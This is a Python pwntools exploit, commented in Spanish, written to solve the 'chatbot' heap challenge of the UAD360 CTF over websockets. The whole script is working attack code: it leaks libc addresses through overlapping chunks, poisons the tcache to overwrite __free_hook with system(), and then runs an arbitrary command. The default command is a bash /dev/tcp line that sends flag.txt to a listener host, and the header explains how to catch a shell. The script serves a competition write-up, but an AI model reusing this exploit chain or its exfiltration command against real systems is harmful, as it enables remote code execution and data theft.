from pwn import *

#######################################################################################
# chatbot exploit por Toni Castillo Girona (socialk@s)
# Twitter: @Disbauxes
#
#	Exploit que resuelve el reto de pwning de chatbot de la UAD360 CTF utilizando
#	un unintended way. ¡Lo prometido es deuda!
#	
#	Primero, se usan chunks pequeños de 0x30 bytes de tamaño. Mediante la técnica de
#	Feng-Shui, ponemos chunks contiguos en memoria y provocamos solapamiento para obtener
#	un leak del non_main_arena. Después, calculamos el OFFSET desde el non_main_arena
#	hacia el CHUNK que contiene la dirección del main_arena. Hacemos un leak de dicho
#	chunk mediante la técnica de obtener un chunk a dicho chunk usando TCache. Después.
#	calculamos direcciones de la libc6, system, y _free_hook y usando de nuevo TCache
#	obtenemos un chunk cerca de __free_hook para sobreescribir con system. Finalmente,
#	liberamos una nueva charla con el comando a ejecutar.
#
#	USO
#		python3 exploit.py [REMOTE] [TRACE] COMMAND="comando_a_ejecutar_remoto"
#              
#       Para recibir shell o la flag, establecer LHOST & LPORT y poner un listener
#       en LHOST:LPORT antes de ejecutar el exploit.
#
#       EJEMPLOS
#				> Comprobar si la flag está en ./flag.txt:
#                   python3 exploit.py REMOTE COMMAND="test -r ./flag.txt && sleep 10s"
#               > Para obtener la flag directamente:
#					nc -lvp LPORT
#                   python3 exploit.py REMOTE
#	NOTAS:
#		Por gandulería, he modificado la librería websockets de python para que me
#		me retorne bytes (no leí demasiado sobre frames, etc ;-)). Ver archivos
#		_abnf.py y _core.py
#              
#       Instalar una versión en local con pip3 install websocket y sobreescribir
#       dichos archivos y listo ;-)
#######################################################################################

# Este es un reto de pwning con interfaz web, internamente utiliza
# websockets para establecer conexión con chatbot_server en 3333:
# (u=new WebSocket("ws://167.235.18.25:3333"))
# https://pypi.org/project/websocket-client/
import websocket
from websocket import create_connection

# sha256 hash
from hashlib import sha256

# Servidor y puerto donde recibir la flag (o la shell):
LHOST   =   b"1.2.3.4"
LPORT   =   b"4444"

# Ponerlo a True para obtener DEBUG de la conexión wsocket:
if args.TRACE:
	tracews	=	True
else:
	tracews	=	False

# Formato del mensaje de chatbot:
# "id":"1655367614.712648376"	(no usado por el servidor)
# "from":"chatbot"				( no usado por el servidor )
# "text":"Bienvenido. Pregunta lo ..."
# "datetime":"1655367614"					(timestamp)
# "hash":"b3da8d94cb6b66ca25c1019.."		
# El hash se calcula: hex.stringify(sha256(msg.datetime+","+msg.text))

def send_message(ws,message,fromm='ctfplayer'):
	# Generamos el timestamp:
	# El id es el timestamp completo (el servidor no lo procesa):
	idm	= str(time.time())
	# datetime sin segundos:
	dt	= bytes(idm.split('.')[0],'ascii')
	# Concatenamos el mensaje con el timestamp (el servidor calculará el hash sha256 de eso).
	# Para poder escribir \x00 en el byte que deseemos sobre el chunk, debemos considerar
	# dos cosas:
	#	1) Debemos calcular el hash sin incluir \x00.
	#	2) Solo podemos escribir un \x00 a cada pasada.
	msg = b''
	for db in message:
		if db != 0:
			msg += p8(db)
		else:
			break
	ho	= dt + b',' + msg
	# Generamos el hash sha256:
	h = sha256()
	# Lo generamos sobre caracteres no nulos:
	h.update(ho)
	hh = h.hexdigest()
	if args.TRACE:
		info("Sending => id: %s, datetime: %s, hash: %s, text: %s", idm,  dt, hh, message)

	# Y ahora generamos el mensaje en formato JSON:
	payload = b'{"id":"' + bytes(idm,'ascii') + b'","from":"' + bytes(fromm,'ascii') + b'","text":"' + message + b'","datetime":"' + dt + b',"hash":"' + bytes(hh,'ascii') + b'"}'
	if args.TRACE:
		print(payload)

	# Mandamos el payload (datos binarios):
	ws.send_binary(payload)

def recv_message(ws):
	# Recibimos un nuevo mensaje del servidor.
	# Hemos modificado la libreria de websockets para que siempre
	# nos devuelva un bytearray. Chatbot siempre envía los frames
	# usando: sym.ws_sendframe_txt()).
	data = ws.recv()
	return data

def	guardar_charla(ws,idcharla,nota):
	send_message(ws,b"/charla " + str(idcharla).encode('ascii',errors='ignore') + b", " + nota)
	data = recv_message(ws)
	if args.TRACE:
		warning("=> %s",data)
	return data

def ver_charla(ws,idcharla):
	send_message(ws,b"/ver " + str(idcharla).encode('ascii'))
	return recv_message(ws)

def editar_charla(ws,idcharla,nota):
	send_message(ws,b"/editar " + str(idcharla).encode('ascii',errors='ignore') + b", " + nota)
	data = recv_message(ws)
	if args.TRACE:
		warning("=> %s",data)
	return data

def borrar_charla(ws,idcharla):
	send_message(ws,b"/borrar " + str(idcharla).encode('ascii'))
	data = recv_message(ws)
	if args.TRACE:
		warning("=> %s", data)
	return data

#
#	leak_chunk()
#		ws			=	Objeto websockets
#		idcharla	=	id de la charla a leakear
#		lenchunk	=	Longitud pedida originalmente. Ej: 0x20.
#		offset		=	Offset dentro del chunk del dato a leakear
#		byteswanted	=	Cuántos bytes queremos leakear.
#		fillwith	=	Relleno para extraer OFFSET.
#
#	NOTA:	esta versión considera que el peor caso tendremos
#			\x00 en alguno de los bytes a extraer:
#
def leak_chunk(ws,idcharla,lenchunk,offset,byteswanted,fillwith):
	# Rellenar el chunk "idcharla" hasta llegar
	# a la posición deseada donde queremos leakear (offset):
	for i in range(lenchunk+0x8,(lenchunk+0x8)+offset):
		editar_charla(ws,idcharla,fillwith*i + fillwith)

	# Obtenemos la respuesta del servidor (podría ser parcial si hay \x00 en la
	# dirección, luego lo arreglamos ;-)):
	data = ver_charla(ws,idcharla)
	# Buscar los datos binarios obtenidos:
	tmp = b''
	for b in range(0,len(data)):
		if data[b] == 0x3a and data[b+1] == 0x22 and data[b+2] == ord(fillwith.decode('ascii')):
			# Skip 3:
			b+=3
			break
	# Consideramos que igual tenemos hasta 8 bytes de leak; extraemos hasta '"':
	for d in range(b+i,b+i+8):
		if data[d] != 0x22:
			tmp += p8(data[d])
		else:
			break
	# Si nos faltan bytes, pedimos más:
	bytes_leaked	=	len(tmp)
	warning("Obtenidos %d/%d bytes desde el chunk [%s]", bytes_leaked, byteswanted,tmp)

	# Si queremos más, rellenamos byte a byte y extraemos byte a byte
	# hasta llegar al número deseado (los bytes ya extraídos se sobreescriben):
	if byteswanted > bytes_leaked:
		# El que viene ahora siempre será \x00, por eso tenemos menos bytes:
		tmp += p8(0x00)
		bytes_leaked+=1
		warning("Obtenidos %d/%d bytes desde el chunk [%s]", bytes_leaked, byteswanted,tmp)

		# Seguimos extrayendo bytes sobreescribiendo el \x00:
		editar_charla(ws,idcharla,fillwith*(lenchunk+0x8+offset) + fillwith*bytes_leaked)
		data = ver_charla(ws,idcharla)
		print(data)

		# Podemos reaprovechar b:
		for d in range(b+i,b+i+byteswanted+1):
			if data[d] != 0x22:
				if data[d] != ord(fillwith.decode('ascii')):
					tmp += p8(data[d])
					bytes_leaked+=1
					continue
			else:
				break

		if byteswanted > bytes_leaked:
			warning("Obtenidos %d&%d bytes, abortando!", bytes_leaked,byteswanted)
			ws.close()
			sys.exit(-1)
		leak = int(tmp[::-1].hex(),16)
		return leak
	# Mejor caso: no hay \x00 y obtenemos todos los bytes de una pasada:
	else:
		leak = int(tmp[::-1].hex(),16)
		return leak

if __name__ == "__main__":

	# Establecemos el contexto a amd64:
	context.arch = "amd64"

	# Conectarnos al servidor remoto o al local utilizando websockets:
	if args.REMOTE:
		server	=	"ws://167.235.18.25:3333"
	else:
		server	=	"ws://192.168.56.4:3333"

	# Comando a ejecutar sobre el servidor:
	if args.COMMAND:
		COMMAND	=	args.COMMAND.encode('ascii')
	else:
        # Recibir la flag directamente:
		COMMAND	=	b"bash -c 'exec 3<>/dev/tcp/" + LHOST + b"/" + LPORT + b";cat ./flag.txt>&3'"

	# Si queremos verbosidad (algo así como el DEBUG=1 XD)
	websocket.enableTrace(tracews)
	ws = create_connection(server)

	# La primera vez recibimos un "Bienvenido". Lo mostramos por pantalla:
	info(recv_message(ws))

	# ##############################################################################
	# PARTE 1: LEAK de la libc6 main_arena.
	# ##############################################################################

	# Entre A y B hay un chunk que no está bajo nuestro control.
	# B,C,D,E,F están uno al lado del otro en memoria:
	guardar_charla(ws,0,b'A'*0x20)		# Tras 'A', hay un chunk que no controlamos.

	# Los siguientes chunks están consecutivos:
	guardar_charla(ws,1,b'B'*0x20)		# Heap overflow sobre C
	guardar_charla(ws,2,b'C'*0x20)		# Expandiremos C para cubrir D:
	guardar_charla(ws,3,b'D'*0x20)		# TCache, Leak non_main_arena (free chunk)
	guardar_charla(ws,4,b'E'*0x20)		# TCache
	guardar_charla(ws,5,b'F'*0x20)		#

	# Antes de eliminar D; ahora D tiene prev_size con "Cs". De este modo,
	# podremos llegar a modificar el campo size + AMP de Chunk D:
	editar_charla(ws,2,b'C'*0x28)

	# Eliminamos D,F. Los dos chunks se van a TCache[1] para Thread 2. Además,
	# obtenemos un leak del non_main_arena de estos chunks. Ahora , en Thread 2,
	# tenemos:
	#Tcachebins[idx=1, size=0x30] count=3  ←  Chunk(addr=0x7fc02c0011a0, size=0x30, flags=PREV_INUSE|NON_MAIN_ARENA)  ←  Chunk(addr=0x7fc02c001580, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0xdeadbeef]	<-- 0xdeadbeef lo controlamos nosotros!!
	borrar_charla(ws,5)
	borrar_charla(ws,3)

	# Ahora editamos B para poder manipular C. Con esto, podemos editar
	# size + AMP:
	editar_charla(ws,1,b'B'*0x28)					# Relleno para poder editar size:
	editar_charla(ws,1,b'B'*0x28 + p16(0x61))		# Size para cubrir Chunk C+D desde Chunk C

	# Ahora C y D están solapados.
	# Cuando tenemos dos chunks solapados
	# bajo nuestro control, podemos hacer leak de los datos del chunk
	# "D" - eliminado - explotando C:
	leak = leak_chunk(ws,2,0x20,0x10,6,b'C')
	warning("Leak del heap non_main_arena: %s", hex(leak).zfill(8))

	# Podemos calcular la base del non_main_arena:
	non_main_arena_base	=	(leak  >> 12) << 12
	warning("Non_main_arena base is %s", hex(non_main_arena_base).zfill(8))

	# La dirección donde tenemos la dirección del main_arena está a 0x890
	# bytes respecto del leak:
	_addr_for_main_arena	=	non_main_arena_base + 0x890
	warning("@ para obtener main_arena en %s", hex(_addr_for_main_arena).zfill(8))

	# Corregimos la dirección del siguiente chunk en la TCache[1] para el chunk que
	# hemos eliminado "D". Podemos indicar la dirección que queramos. Podemos indicar
	# la misma dirección que hemos obtenido para el chunk:
	addr = _addr_for_main_arena - 0x19
	info("Configurando dirección para leak main_arena: %s ", hex(addr).zfill(8))
	editar_charla(ws,2,b'C'*0x30 + p64(addr))

	# Corregimos size + AMP:
	editar_charla(ws,2,b'C'*0x28 + p64(0x31))

	# Corregimos prev_size:
	editar_charla(ws,2,b'C'*0x20 + p64(0x31))

	# Ahora, si pedimos otra charla del mismo tamaño,el sistema nos la retornará
	# de TCache[1], la que el mismo Thread eliminó:
	guardar_charla(ws,3,b'X'*0x20)	# Chunk(addr=0x7fc02c001580)

	# Pedimos otro chunk del tamaño adecuado; el sistema nos devuelve de
	# TCache[1] el chunk que apunta cerca del chunk con la dirección de la libc6
	# main_arena:
	guardar_charla(ws,5,b'x'*0x18)		# En este chunk hay la dirección del main arena
	leak_main_arena = leak_chunk(ws,5,0x10,0x1,6,b'j')
	warning("Leak de la libc6 main_arena %s", hex(leak_main_arena).zfill(8))

	# Calculamos el offset de la libc6:
	libc6_base	=	leak_main_arena - 0x1cab80
	warning("libc6 base address %s", hex(libc6_base).zfill(8))

	# Versión de libc6:
	# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.
	# Calculamos la dirección de system , _malloc_hook y __free_hook a partir de los
	# offsets:
	system_addr			=	libc6_base + 0x302c0
	malloc_hook_addr	= 	libc6_base + 0x1cab70
	free_hook_addr		=	libc6_base + 0x1cce48
	warning("system está en %s", hex(system_addr).zfill(8))
	warning("__malloc_hook está en %s", hex(malloc_hook_addr).zfill(8))
	warning("__free_hook está en %s", hex(free_hook_addr).zfill(8))

	# ##############################################################################
	# PARTE 2: TCache para sobreescribir __free_hook con system()
	# ##############################################################################

	# Ahora que tenemos las direcciones, montamos otro grupo de chunks pero de
	# tamaño 0x30 (será 0x40) para que vaya a TCache[2]:
	guardar_charla(ws,7,b'!'*0x30)					# Tras este, el sistema añade otro Chunk.
	guardar_charla(ws,8,b'@'*0x30)					# Sobreescribiremos #
	guardar_charla(ws,9,b'#'*0x30)					# Solapamiento entre # y $:
	guardar_charla(ws,10,b'$'*0x30)					# TCache
	guardar_charla(ws,11,b'/'*0x30)					# TCache
	guardar_charla(ws,13,COMMAND)					# Comando a ejecutar

	# Antes de eliminar $, nos aseguramos de rellenar prev_size editando
	# '#' para así después poder modificar su size + AMP:
	editar_charla(ws,9,b'#'*0x38)

	# Eliminamos los chunks '/' y '$', se van a la TCache[2] del Thread. El orden
	# es el mismo que anteriormente, así: primera llamada a malloc se escribe NEXT
	# en TCache[2] con la dirección de __free_hook. Segunda llamada a malloc nos
	# retornará un chunk hacia __free_malloc:
	borrar_charla(ws,11)
	borrar_charla(ws,10)

	# Editamos '@' para poder editar '#'. Con esto, podremos editar size + AMP de '#':
	editar_charla(ws,8,b'@'*0x38)				# Relleno para poder editar size de '#'
	editar_charla(ws,8,b'@'*0x38 + p16(0x85))	# Size para cubrir Chunk #,$ desde Chunk '#'

	# Debemos rellenar '#' hasta llegar a cubrir todo el Chunk en TCache[2]
	for x in range(0,25):
		editar_charla(ws,9,b'@'*0x38 + b'#'*x)

	# Corregimos Next size en TChunk:
	editar_charla(ws,9,b'@'*0x48 + p64(0x45))

	# Ahora ponemos la dirección de malloc_hook sobre TCache:
	# Lo tenemos a 0x38 + 16 = 0x48. Debemos compensar los bytes de relleno,
	# así que escribimos más atrás:
	free_hook_fill = free_hook_addr-0x28
	info("Candidato para relleno __free_hook: %s", hex(free_hook_fill).zfill(8))
	editar_charla(ws,9,b'@'*0x40 + p64(free_hook_fill))

	# Ahora debemos poner a 0x45 el tamaño del chunk, con A=1,M=0,P=1:
	editar_charla(ws,9,b'@'*0x38 + p64(0x45))

	# Debemos corregir el tamaño prev_size también:
	editar_charla(ws,9,b'@'*0x30 + p64(0x40))

	# Sacamos de TCache el chunk que apunta a __free_hook. Rellenamos:
	data = guardar_charla(ws,10,b'I'*0x30)
	# Si logramos crear esta charla, __free_hook lo tenemos como chunk:
	if b'Charla guardada correctamente' in data:

		# Ahora escribiremos sobre __free_hook_fill la dirección de system:
		info("Escribiendo system (%s) sobre __free_hook-offset (%s)", hex(system_addr).zfill(8), hex(free_hook_fill).zfill(8))
		data = guardar_charla(ws,11,b'I'*0x28 + p64(system_addr))

		# Si retorna OK, hemos logrado sobreescribir __free_hook:
		if b'Charla guardada correctamente' in data:

			# En estos momentos se están produciendo llamadas a free()
			# y system está intentando ejecutar morralla, con "not found"
			# o "syntax error". Cuando termine, nos toca ;-)

			# Nosotros podemos ejecutar el comando que queramos liberando
			# la charla 13:
			warning("Ejecutando comando: %s", COMMAND.decode('ascii'))
			data = borrar_charla(ws,13)

			# Si el comando se ejecuta y no hay crash, obtendremos "Charla Eliminada":
			print(data)
			ws.close()
			sys.exit(0)
		else:
			error("No se puedo sobreescribir el hook: %s", data)
			ws.close()
			sys.exit(-1)
	else:
		error("No se obtuvo un chunk -> hook-. %s", data)
		ws.close()
		sys.exit(-1)
